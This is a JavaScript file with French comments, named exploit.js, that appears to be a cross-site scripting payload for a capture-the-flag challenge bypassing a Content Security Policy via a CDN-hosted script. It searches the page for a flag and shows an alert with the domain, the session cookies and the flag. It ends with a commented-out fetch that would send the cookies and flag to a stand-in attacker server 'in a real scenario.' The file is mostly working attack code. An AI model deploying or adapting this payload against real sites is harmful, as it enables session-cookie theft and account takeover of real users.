// exploit.js
// Ce script sera hébergé sur GitHub et servi via cdn.jsdelivr.net

// Tenter de trouver et d'afficher un drapeau s'il existe dans des emplacements CTF courants
let flagContent = "Aucun drapeau trouvé via les motifs courants.";
try {
    if (window.FLAG_IN_JS) {
        flagContent = "Trouvé dans window.FLAG_IN_JS: " + window.FLAG_IN_JS;
    } else if (document.getElementById('flag')) {
        flagContent = "Trouvé dans l'élément #flag: " + document.getElementById('flag').textContent;
    } else {
        // Rechercher le format typique du drapeau dans tout le texte du corps du document
        const bodyText = document.body.innerText;
        const flagRegex = /CTF{[^}]+}|flag{[^}]+}/i;
        const match = bodyText.match(flagRegex);
        if (match) {
            flagContent = "Trouvé via regex: " + match[0];
        }
    }
} catch (e) {
    console.error("Erreur lors de la recherche du drapeau :", e);
    flagContent = "Erreur d'accès aux emplacements potentiels du drapeau.";
}

alert(
    'CSP Contournée !\n' +
    'Domaine: ' + document.domain + '\n' +
    'Cookie: ' + document.cookie + '\n' +
    'Tentative de découverte du drapeau: ' + flagContent
);

// Dans un scénario réel, vous exfiltreriez ces données :
// fetch('https://votre-serveur-attaquant.com/log?data=' + encodeURIComponent(document.cookie + ' | ' + flagContent));